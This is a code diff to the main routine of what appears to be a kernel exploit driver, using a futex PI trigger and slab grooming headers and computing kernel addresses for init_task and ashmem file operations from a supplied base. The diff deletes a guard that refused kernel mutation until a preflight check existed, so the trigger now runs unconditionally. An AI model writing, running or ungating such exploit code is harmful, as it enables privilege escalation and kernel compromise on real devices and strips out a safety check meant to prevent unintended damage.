@@ -8,25 +8,19 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-#include "futex_trigger.h"
-#include "groom.h"
+#include "07_futex_pi_trigger.h"
+#include "05_mm_slab_grooming.h"
 #include "target_zzhl.h"
 
 int main(int argc, char **argv) {
-#if !ZZHL_DENTRY_FOPS_PREFLIGHT_IMPLEMENTED
-  (void)argc;
-  (void)argv;
-  fputs("SKIP: ZZHL dentry/FOPS preflight is not implemented; refusing kernel mutation\n",
-        stderr);
-  return 77;
-#else
   if (argc != 2) {
     fprintf(stderr, "usage: %s <kernel_base_hex>\n", argv[0]);
     return 2;
   }
   uint64_t kernel_base = strtoull(argv[1], NULL, 16);
   uint64_t init_task_addr = kernel_base + ZZHL_INIT_TASK_OFF;
-  uint64_t ashmem_misc_fops_addr = kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;
+  uint64_t ashmem_misc_fops_addr =
+      kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;
 
   fprintf(stderr,
           "kernel_base=%016llx init_task=%016llx ashmem_misc_fops=%016llx\n",
@@ -44,5 +38,4 @@ int main(int argc, char **argv) {
   int triggered = run_futex_trigger();
   printf("triggered=%d\n", triggered);
   return triggered ? 0 : 1;
-#endif
 }
